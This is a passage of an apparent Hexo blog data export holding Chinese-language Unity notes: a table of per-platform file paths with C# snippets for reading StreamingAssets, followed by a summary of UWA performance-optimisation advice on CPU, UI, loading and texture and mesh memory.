Support/打包的名字/AB|absolute(绝对路径)\nmac-UnityEditor|Application.temporaryCachePath|/var/folders/n0/xxx/T/打包的名字/AB|absolute(绝对路径)\nwindows-UnityEditor|Application.dataPath|xxx/项目名字/Assets|absolute(绝对路径)\nwindows-UnityEditor|Application.streamingAssetsPath|xxx/项目名字/Assets/StreamingAssets|absolute(绝对路径)\nwindows-UnityEditor|Application.persistentDataPath|C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字|absolute(绝对路径)\nwindows-UnityEditor|Application.temporaryCachePath|C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字|absolute(绝对路径)\n\n# 编译成安装包之后运行的路径\nPlatform | Method | Path | Relative,absolute    \n-------------------------|-------------------------|-------------------------|-------------------------\nmac.app|Application.dataPath|xxx/mac.app/Contents|absolute(绝对路径)\nmac.app|Application.streamingAssetsPath|xxx/mac.app/Contents/Resources/Data/StreamingAssets|absolute(绝对路径)\nmac.app|Application.persistentDataPath|/Users/用户名字/Library/Application Support/打包的名字/AB|absolute(绝对路径)\nmac.app|Application.temporaryCachePath|/var/folders/n0/xxx/T/打包的名字/AB|absolute(绝对路径)\nwindows.exe|Application.dataPath|xxx/Assets|absolute(绝对路径)\nwindows.exe|Application.streamingAssetsPath|xxx/Assets/StreamingAssets|absolute(绝对路径)\nwindows.exe|Application.persistentDataPath|C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字|absolute(绝对路径)\nwindows.exe|Application.temporaryCachePath|C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字|absolute(绝对路径)\nAndroid.apk|Application.dataPath|/data/app/(Package Name)-xxx/base.apk|absolute(绝对路径)\nAndroid.apk|Application.streamingAssetsPath|jar:file:///data/app/(Package Name)-xxx/base.apk!/assets|absolute(绝对路径)\nAndroid.apk|Application.persistentDataPath|/storage/emulated/0/Android/data/(Package Name)/files|absolute(绝对路径)\nAndroid.apk|Application.temporaryCachePath|/storage/emulated/0/Android/data/(Package Name)/cache|absolute(绝对路径)\niOS.ipa|Application.dataPath|/private/var/containers/Bundle/Application/xxx/AB.app/Data|absolute(绝对路径)\niOS.ipa|Application.streamingAssetsPath|/private/var/containers/Bundle/Application/xxx/AB.app/Data/Raw|absolute(绝对路径)\niOS.ipa|Application.persistentDataPath|/var/mobile/Containers/Data/Application/xxx/Documents|absolute(绝对路径)\niOS.ipa|Application.temporaryCachePath|/var/mobile/Containers/Data/Application/xxx/Library/Caches|absolute(绝对路径)\n\n\n# Android 真机读取\n```\n    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n```\n\n# iOS,MAC,Windows 平台读取\n```\n    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(\"file://\" +Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(\"file://\" + Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n\n    string path = Application.streamingAssetsPath + \"/\" + \"xxx.xxx\";\n    if (File.Exists(path)) //判断文件是否存在\n    {\n        StreamReader streamReader = File.OpenText(path);\n        ShowPath.text = streamReader.ReadToEnd();\n        streamReader.Close();\n    }\n```\n\n","slug":"Unity/Path/平台路径","published":1,"updated":"2020-08-11T14:12:09.678Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0g00472gk79w228umw","content":"<h1 id=\"编辑器下运行的路径\"><a href=\"#编辑器下运行的路径\" class=\"headerlink\" title=\"编辑器下运行的路径\"></a>编辑器下运行的路径</h1><table>\n<thead>\n<tr>\n<th>Platform</th>\n<th>Method</th>\n<th>Path</th>\n<th>Relative,absolute</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mac-UnityEditor</td>\n<td>Application.dataPath</td>\n<td>xxx/项目名字/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/项目名字/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.persistentDataPath</td>\n<td>/Users/用户名字/Library/Application Support/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/folders/n0/xxx/T/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.dataPath</td>\n<td>xxx/项目名字/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/项目名字/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.persistentDataPath</td>\n<td>C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.temporaryCachePath</td>\n<td>C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n</tbody></table>\n<h1 id=\"编译成安装包之后运行的路径\"><a href=\"#编译成安装包之后运行的路径\" class=\"headerlink\" title=\"编译成安装包之后运行的路径\"></a>编译成安装包之后运行的路径</h1><table>\n<thead>\n<tr>\n<th>Platform</th>\n<th>Method</th>\n<th>Path</th>\n<th>Relative,absolute</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mac.app</td>\n<td>Application.dataPath</td>\n<td>xxx/mac.app/Contents</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/mac.app/Contents/Resources/Data/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.persistentDataPath</td>\n<td>/Users/用户名字/Library/Application Support/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/folders/n0/xxx/T/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.dataPath</td>\n<td>xxx/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.persistentDataPath</td>\n<td>C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.temporaryCachePath</td>\n<td>C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.dataPath</td>\n<td>/data/app/(Package Name)-xxx/base.apk</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.streamingAssetsPath</td>\n<td>jar:file:///data/app/(Package Name)-xxx/base.apk!/assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.persistentDataPath</td>\n<td>/storage/emulated/0/Android/data/(Package Name)/files</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.temporaryCachePath</td>\n<td>/storage/emulated/0/Android/data/(Package Name)/cache</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.dataPath</td>\n<td>/private/var/containers/Bundle/Application/xxx/AB.app/Data</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.streamingAssetsPath</td>\n<td>/private/var/containers/Bundle/Application/xxx/AB.app/Data/Raw</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.persistentDataPath</td>\n<td>/var/mobile/Containers/Data/Application/xxx/Documents</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/mobile/Containers/Data/Application/xxx/Library/Caches</td>\n<td>absolute(绝对路径)</td>\n</tr>\n</tbody></table>\n<h1 id=\"Android-真机读取\"><a href=\"#Android-真机读取\" class=\"headerlink\" title=\"Android 真机读取\"></a>Android 真机读取</h1><pre><code>    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;</code></pre><h1 id=\"iOS-MAC-Windows-平台读取\"><a href=\"#iOS-MAC-Windows-平台读取\" class=\"headerlink\" title=\"iOS,MAC,Windows 平台读取\"></a>iOS,MAC,Windows 平台读取</h1><pre><code>    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(&quot;file://&quot; +Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(&quot;file://&quot; + Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n\n    string path = Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;;\n    if (File.Exists(path)) //判断文件是否存在\n    {\n        StreamReader streamReader = File.OpenText(path);\n        ShowPath.text = streamReader.ReadToEnd();\n        streamReader.Close();\n    }</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"编辑器下运行的路径\"><a href=\"#编辑器下运行的路径\" class=\"headerlink\" title=\"编辑器下运行的路径\"></a>编辑器下运行的路径</h1><table>\n<thead>\n<tr>\n<th>Platform</th>\n<th>Method</th>\n<th>Path</th>\n<th>Relative,absolute</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mac-UnityEditor</td>\n<td>Application.dataPath</td>\n<td>xxx/项目名字/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/项目名字/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.persistentDataPath</td>\n<td>/Users/用户名字/Library/Application Support/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac-UnityEditor</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/folders/n0/xxx/T/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.dataPath</td>\n<td>xxx/项目名字/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/项目名字/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.persistentDataPath</td>\n<td>C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows-UnityEditor</td>\n<td>Application.temporaryCachePath</td>\n<td>C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n</tbody></table>\n<h1 id=\"编译成安装包之后运行的路径\"><a href=\"#编译成安装包之后运行的路径\" class=\"headerlink\" title=\"编译成安装包之后运行的路径\"></a>编译成安装包之后运行的路径</h1><table>\n<thead>\n<tr>\n<th>Platform</th>\n<th>Method</th>\n<th>Path</th>\n<th>Relative,absolute</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mac.app</td>\n<td>Application.dataPath</td>\n<td>xxx/mac.app/Contents</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/mac.app/Contents/Resources/Data/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.persistentDataPath</td>\n<td>/Users/用户名字/Library/Application Support/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>mac.app</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/folders/n0/xxx/T/打包的名字/AB</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.dataPath</td>\n<td>xxx/Assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.streamingAssetsPath</td>\n<td>xxx/Assets/StreamingAssets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.persistentDataPath</td>\n<td>C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>windows.exe</td>\n<td>Application.temporaryCachePath</td>\n<td>C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.dataPath</td>\n<td>/data/app/(Package Name)-xxx/base.apk</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.streamingAssetsPath</td>\n<td>jar:file:///data/app/(Package Name)-xxx/base.apk!/assets</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.persistentDataPath</td>\n<td>/storage/emulated/0/Android/data/(Package Name)/files</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>Android.apk</td>\n<td>Application.temporaryCachePath</td>\n<td>/storage/emulated/0/Android/data/(Package Name)/cache</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.dataPath</td>\n<td>/private/var/containers/Bundle/Application/xxx/AB.app/Data</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.streamingAssetsPath</td>\n<td>/private/var/containers/Bundle/Application/xxx/AB.app/Data/Raw</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.persistentDataPath</td>\n<td>/var/mobile/Containers/Data/Application/xxx/Documents</td>\n<td>absolute(绝对路径)</td>\n</tr>\n<tr>\n<td>iOS.ipa</td>\n<td>Application.temporaryCachePath</td>\n<td>/var/mobile/Containers/Data/Application/xxx/Library/Caches</td>\n<td>absolute(绝对路径)</td>\n</tr>\n</tbody></table>\n<h1 id=\"Android-真机读取\"><a href=\"#Android-真机读取\" class=\"headerlink\" title=\"Android 真机读取\"></a>Android 真机读取</h1><pre><code>    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;</code></pre><h1 id=\"iOS-MAC-Windows-平台读取\"><a href=\"#iOS-MAC-Windows-平台读取\" class=\"headerlink\" title=\"iOS,MAC,Windows 平台读取\"></a>iOS,MAC,Windows 平台读取</h1><pre><code>    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(&quot;file://&quot; +Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(&quot;file://&quot; + Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;);  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n\n    string path = Application.streamingAssetsPath + &quot;/&quot; + &quot;xxx.xxx&quot;;\n    if (File.Exists(path)) //判断文件是否存在\n    {\n        StreamReader streamReader = File.OpenText(path);\n        ShowPath.text = streamReader.ReadToEnd();\n        streamReader.Close();\n    }</code></pre>"},{"title":"Unity UWA工具检测优化","date":"2020-05-08T03:41:32.000Z","top":4,"_content":"\n# 性能优化大合集,请看下面的官方介绍\n* UWA 优化百科向导: https://blog.uwa4d.com/archives/Index.html  \n* UWA Unity性能优化大合集，All In One ! https://blog.uwa4d.com/archives/allinone.html\n* 如何看懂性能报告  https://blog.uwa4d.com/archives/Simple_PA_General.html\n\n\n****\n\n\n# 性能总结\n* 查看这个性能分析图,性能总结--> https://www.uwa4d.com/demo/pa.html?v=5x&platform=android&name=jws&device=RedMiNote2 \n>* 总体帧数：以一秒 30 帧为例,10 分钟测试,理想性能帧数可以跑到16000~18000帧,如果项目帧数低于这个范围，那么你的游戏可能正在经受一定的帧率卡顿问题,需要查看某一段时间内的性能瓶颈       \n>* 总场景数     \n>* GC次数：测试过程中系统垃圾回收操作（Garbage Collection）的调用次数,每次GC调用均会造成一定程度上的卡顿，降低了项目运行的流畅度,如果开发人员的逻辑代码分配堆内存过大过快的话，则GC调用的次数也会随之增加,标准为1000帧/次以上调用 GC,这个值越大调用一次 GC 越好.      \n>* CPU均值：测试过程中平均每帧的CPU占用.高/中/低档的主流机型,设备性能越好，CPU耗时的均值肯定是越低        \n>* CPU 占用(帧数占比):这个地方是 4 个图,CPU耗时超过33ms的帧数耗时超过了68%（请注意，UWA的建议是低于10%），超过50ms的帧数耗时达到35%.      \n>* 总体 CPU 耗时走势:如果某条线特别高,需要看下是否可以进行优化,对比测试       \n>* 总内存,堆内存优化:根据不同游戏进行不同的设定,定制一个合理的内存峰值才是正确的,也需要根据不同机器的性能评定.目前Unity所使用的Mono版本有这么个特点,Mono的堆内存一旦分配，就不会返还给系统.这意味着Mono的堆内存是只升不降的.IL2CPP版本在堆内存分配方面和Mono 最大的不同主要是Reserved Total 是可以下降的，而 Mono的 Reserved Total 只会上升不会下降.    \n>* 关于任务列表:UWA 的测评报告还根据性能状态给出了优化任务列表,按照问题的严重程度设置了优先级，并对每个优化任务给出了需要检查或优化的步骤。     \n>* 高 CPU 占用函数:       \n>>Camera.Render    \n>>UIPanel.LateUpdate()     \n>>UnityEngine.SetupCoroutine() <Coroutine- InvokeMoveNext>     \n>>Animators.Update     \n>>Loading.UpdatePreloading     \n>>NavMeshManager       \n>>UICamera.Update()        \n>>UIRect.Update()      \n>>Physics.Processing       \n>>LoadingManager.Update()      \n>>Monobehaviour.OnMouse_       \n>>SystemInfoPrinter.Update()       \n>>TionManager.Update()     \n>>MeshSkinning.Update      \n>>AINormalWarrior.Update()     \n>>Physics.ProcessReports       \n>>SoundManager.Update()        \n>>Destroy      \n>>UIRect.Start()       \n>>TweenEffectBase.Update()     \n\n>* 高堆内存分配函数:     \n\n>>UIPanel.LateUpdate()    \n>>UnityEngine.SetupCoroutine() <Coroutine- InvokeMoveNext>    \n>>UICamera.Update()   \n>>TionManager.Update()    \n>>Physics.ProcessReports  \n>>LoadingManager.Update() \n>>Animators.Update    \n>>BattleWinWnd.ShowContinueTip()  \n>>CheatManager.Update()   \n>>Destroy \n>>UIRect.Start()  \n>>DynamicContent.Update() \n>>EnemyHintAgent.Update() \n>>Loading.UpdatePreloading    \n>>UIMessageBoxManager.Update()    \n>>GroupTutorialSystem.Update()    \n>>iTween.Update() \n>>LevelManager.Update()   \n>>AINormalWarrior.Update()    \n>>PlayerBattleHUD.LateUpdate()\n\n\n****\n\n\n# 性能优化---CPU篇\n* 查看这个性能分析图,总体性能趋势--> https://www.uwa4d.com/demo/pa.html?v=5x&platform=android&name=jws&device=RedMiNote2 \n* CPU方面的性能开销主要可归结为两大类：引擎模块性能开销(渲染模块、动画模块、物理模块、UI模块、粒子系统、加载模块和GC调用等等)和自身代码性能开销(第三方,以及 Unity 管理不到的内存)\n>* 渲染模块 :\n>>（1）降低Draw Call,与维持总线带宽平衡,Draw Call是渲染模块优化方面的重中之重,一般来说，Draw Call越高，则渲染模块的CPU开销越大,降低Draw Call的方法则主要是减少所渲染物体的材质种类,并通过Draw Call Batching(https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw Call越小越好,决定渲染模块性能的除了Draw Call之外，还有用于传输渲染数据的总线带宽.当我们使用Draw Call Batching将同种材质的网格模型拼合在一起时，可能会造成同一时间需要传输的数据（Texture、VB/IB等）大大增加，以至于造成带宽“堵塞”，在资源无法及时传输过去的情况下，GPU只能等待，从而反倒降低了游戏的运行帧率。Draw Call和总线带宽是天平的两端，我们需要做的是尽可能维持天平的平衡，任何一边过高或过低，对性能来说都是无益的。\n>> (2) 简化资源,每帧渲染的三角形面片数、网格和纹理资源的具体使用情况    \n\n>* UI 模块\n>> 在NGUI的优化方面，UIPanel.LateUpdate为性能优化的重中之重,它是NGUI中CPU开销最大的函数，没有之一.\n>> 对于UIPanel.LateUpdate的优化，主要着眼于UIPanel的布局，其原则如下：\n>>> * 尽可能将动态UI元素和静态UI元素分离到不同的UIPanel中（UI的重建以UIPanel为单位），从而尽可能将因为变动的UI元素引起的重构控制在较小的范围内；\n>>> * 尽可能让动态UI元素按照同步性进行划分，即运动频率不同的UI元素尽可能分离放在不同的UIPanel中；\n>>> * 控制同一个UIPanel中动态UI元素的数量，数量越多，所创建的Mesh越大，从而使得重构的开销显著增加。比如，战斗过程中的HUD运动血条可能会出现较多，此时，建议研发团队将运动血条分离成不同的UIPanel，每组UIPanel下5~10个动态UI为宜。这种做法，其本质是从概率上尽可能降低单帧中UIPanel的重建开销。\n>* 加载模块     \n>> 加载模块的性能开销比较集中，主要出现于场景切换处(前一场景的场景卸载和下一场景的场景加载)，且CPU占用峰值均较高            \n>> 场景卸载情况下的 Destroy,引擎在切换场景时会收集未标识成“DontDestoryOnLoad”的GameObject及其Component，然后进行Destroy。同时，代码中的OnDestory被触发执行，这里的性能开销主要取决于OnDestroy回调函数中的代码逻辑。         \n>> 场景卸载情况下的 Resources.UnloadUnusedAssets 一般情况下，场景切换过程中，该API会被调用两次，一次为引擎在切换场景时自动调用，另一次则为用户手动调用（一般出现在场景加载后，用户调用它来确保上一场景的资源被卸载干净）。在我们测评过的大量项目中，该API的CPU开销主要集中在500ms~3000ms之间。其耗时开销主要取决于场景中Asset和Object的数量，数量越多，则耗时越慢。         \n>> 场景加载情况下的  资源加载,资源加载几乎占据了整个加载过程的90%时间以上，其加载效率主要取决于资源的加载方式（Resource.Load或AssetBundle加载）、加载量（纹理、网格、材质等资源数据的大小）和资源格式（纹理格式、音频格式等）等等。不同的加载方式、不同的资源格式，其加载效率可谓千差万别，所以我们在UWA测评报告中，特别将每种资源的具体使用情况进行展示，以帮助用户可以立刻查找到问题资源并及时进行改正。          \n>> 场景加载情况下的 Instantiate实例化 :在场景加载过程中，往往伴随着大量的Instantiate实例化操作，比如UI界面实例化、角色/怪物实例化、场景建筑实例化等等。在Instantiate实例化时，引擎底层会查看其相关的资源是否已经被加载，如果没有，则会先加载其相关资源，再进行实例化，这其实是大家遇到的大多数“Instantiate耗时问题”的根本原因，这也是为什么我们在之前的AssetBundle文章中所提倡的资源依赖关系打包并进行预加载，从而来缓解Instantiate实例化时的压力（关于AssetBundle资源的加载，则是另一个很大的Story了，我们会在以后的AssetBundle加载技术专题中进行详细的讲解）          \n>> 场景加载情况下的 SerializedField序列化开销 Instantiate实例化的性能开销还体现在脚本代码的序列化上，如果脚本中需要序列化的信息很多，则Instantiate实例化时的时间亦会很长。最直接的例子就是NGUI，其代码中存在很多SerializedField标识，从而在实例化时带来了较多的代码序列化开销。因此，在大家为代码增加序列化信息时，这一点是需要大家时刻关注的\n> * 代码效率    \n>> 性能开销都遵循着“二八原则”,即80%的性能开销都集中在20%的函数上\n>> Camera.Render    \n>> MovementScript.FixedUpdate()         \n>> ParticleSystem.Update        \n>> Physics.Simulate         \n>> TerrainManager.LoadTerrainObject()[Coroutine:MoveNext]       \n>> TerrainManager.LoadTerrainSplices()[Coroutine:MoveNext]       \n>> ParticleSystem.WaitForUpdateThreads()         \n>> GameStarter.Update()         \n>> 等等\n\n\n****\n\n\n# 性能优化，进无止境-内存篇\n* 1 内存的开销无外乎以下三大部分:1.Unity资源内存占用；2. Unity引擎模块自身内存占用；3.Unity用户管理内存;4.第三方插件内存(比如 toLua),不属于Unity 。\n### 一:资源内存占用\n在一个较为复杂的大中型项目中，资源的内存占用往往占据了总体内存的70%以上.纹理（Texture）、网格（Mesh）、动画片段（AnimationClip）、音频片段（AudioClip）、材质（Material）、着色器（Shader）、字体资源（Font）以及文本资源（Text Asset）等等.其中，纹理、网格、动画片段和音频片段则是最容易造成较大内存开销的资源\n#### 纹理\n>> * 纹理资源可以说是几乎所有游戏项目中占据最大内存开销的资源,一个6万面片的场景，网格资源最大才不过10MB，但一个2048x2048的纹理，可能直接就达到16MB.需要优化的点      \n>> 纹理格式:Android平台的ETC、iOS平台的PVRTC、Windows PC上的DXT,具体的采用何种方式对纹理进行操作需要根据项目情况来看.\n>> 在使用硬件支持的纹理格式时，你可能会遇到以下几个问题：\n>>> * 色阶问题,由于ETC、PVRTC等格式均为有损压缩，因此，当纹理色差范围跨度较大时，均不可避免地造成不同程度的“阶梯”状的色阶问题。因此，很多研发团队使用RGBA32/ARGB32格式来实现更好的效果。但是，这种做法将造成很大的内存占用。比如，同样一张1024x1024的纹理，如果不开启Mipmap，并且为PVRTC格式，则其内存占用为512KB，而如果转换为RGBA32位，则很可能占用达到4MB。所以，研发团队在使用RGBA32或ARGB32格式的纹理时，一定要慎重考虑，更为明智的选择是尽量减少纹理的色差范围，使其尽可能使用硬件支持的压缩格式进行储存。\n>>> * ETC1 不支持透明通道问题,在Android平台上，对于使用OpenGL ES 2.0的设备，其纹理格式仅能支持ETC1格式，该格式有个较为严重的问题，即不支持Alpha透明通道，使得透明贴图无法直接通过ETC1格式来进行储存。对此，我们建议研发团队将透明贴图尽可能分拆成两张，即一张RGB24位纹理记录原始纹理的颜色部分和一张Alpha8纹理记录原始纹理的透明通道部分。然后，将这两张贴图分别转化为ETC1格式的纹理，并通过特定的Shader来进行渲染，从而来达到支持透明贴图的效果。该种方法不仅可以极大程度上逼近RGBA透明贴图的渲染效果，同时还可以降低纹理的内存占用，是我们非常推荐的使用方式。建议:尽量采用 ETC2,在 Android 设备支持OpenGL ES 3.0的上面进行市场分流       \n\n>> * 纹理尺寸,一般来说，纹理尺寸越大，则内存占用越大。尽可能降低纹理尺寸,如果512x512的纹理对于显示效果已经够用，那么就不要使用1024x1024的纹理.\n>> * Mipmap功能,Mipmap旨在有效降低渲染带宽的压力，提升游戏的渲染效率.开启Mipmap会将纹理内存提升1.33倍.对于具有较大纵深感的3D游戏来说，3D场景模型和角色我们一般是建议开启Mipmap功能的.但是经常会发现部分UI纹理也开启了Mipmap功能,这其实就没有必要的,绝大多数UI均是渲染在屏幕最上层，开启Mipmap并不会提升渲染效率，反倒会增加无谓的内存占用.\n>> *  Read & Write 一般情况下，纹理资源的“Read & Write”功能在Unity引擎中是默认关闭的。项目深度优化时发现了不少项目的纹理资源会开启该选项,\n\n#### 网格\n>> * Normal、Color和Tangent,Mesh资源的数据中经常会含有大量的Color数据、Normal数据和Tangent数据,这些数据的存在将大幅度增加Mesh资源的文件体积和内存占用.Color数据和Normal数据主要为3DMax、Maya等建模软件导出时设置所生成，而Tangent一般为导入引擎时生成.更为麻烦的是，如果项目对Mesh进行Draw Call 